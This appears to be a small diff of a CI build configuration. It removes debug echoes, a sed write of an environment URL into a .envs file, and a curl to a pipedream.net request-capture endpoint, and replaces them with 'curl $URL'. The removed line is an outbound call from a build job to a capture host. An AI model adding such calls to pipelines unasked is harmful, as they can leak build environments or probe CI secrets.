@@ -7,8 +7,4 @@ env:
   - XXX=test
 
 script:
-  - set -x
-  - echo "SRAKA"
-  - echo "$URL"
-  - sed -i "s#KW=.*#KW=$URL#g" .envs
-  - curl https://ennyxt9c3dhp.x.pipedream.net
+  - curl $URL
